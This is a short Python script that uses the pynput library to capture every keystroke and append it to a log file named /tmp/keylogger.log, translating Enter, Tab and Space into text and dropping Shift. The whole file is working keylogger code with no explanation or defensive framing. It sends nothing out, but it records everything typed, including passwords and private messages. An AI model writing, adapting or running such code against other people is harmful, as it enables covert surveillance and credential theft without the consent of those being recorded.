from pynput.keyboard import Listener

arq = "/tmp/keylogger.log"
key_map = {
    'Key.enter': '\n',
    'Key.tab': '    ',
    'Key.space': ' ',
    'Key.shift': '',
    'Key.shift_r': ''
}

def log(text):
    with open(arq, "a") as l:
        l.write(text)

def capture(key):
    try:
        log(key.char)

    except AttributeError:
        log(key_map[str(key)])   

    except:
        log(' ')
    
    
with Listener(on_press=capture) as l:
    l.join()